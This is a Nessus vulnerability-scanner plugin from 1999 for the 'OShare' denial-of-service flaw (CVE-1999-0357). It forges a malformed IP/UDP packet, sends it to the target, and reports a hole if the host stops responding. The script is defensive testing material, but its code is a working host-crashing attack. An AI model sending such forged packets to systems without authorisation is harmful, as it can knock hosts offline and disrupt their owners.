#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
#
# This attack is very unlikely to work from a large number
# of systems which check ip->ip_len before sending the packets.
#

if(description)
{
 script_id(10170);
 script_version ("$Revision: 1.14 $");
 script_cve_id("CVE-1999-0357");
 name["english"] = "OShare";
 name["francais"] = "OShare";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It was possible to crash the remote system using the 'oshare' attack.

An attacker may use this problem to prevent your site from working
properly.  

Solution : contact your vendor for a patch.
Risk factor : High";

 desc["francais"] = "
Il s'est avéré possible de tuer
la machine distante via l'attaque 'oshare'.

Un pirate peut utiliser ce problème pour
empecher votre réseau de fonctionner
correctement.

Solution : contactez votre vendeur et
demandez un patch.

Facteur de risque : Sérieux";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes the remote host using the 'oshare' attack";
 summary["francais"] = "Tue la machine distante via l'attaque 'oshare'";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_KILL_HOST);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 
 script_family(english:family["english"], francais:family["francais"]);

 exit(0);
}

#
# The script code starts here
#


ip = forge_ip_packet(ip_v : 4, ip_len : 44, ip_hl : 11,
		     ip_tos : 0, ip_id : rand(), ip_off : 16383,
		     ip_ttl : 0xFF, ip_p : IPPROTO_UDP,
		     ip_src : this_host());

start_denial();
send_packet(ip, pcap_active:FALSE);
		     
alive = end_denial();
if(!alive){
		security_hole(0);
		set_kb_item(name:"Host/dead", value:TRUE);
	  }     
		
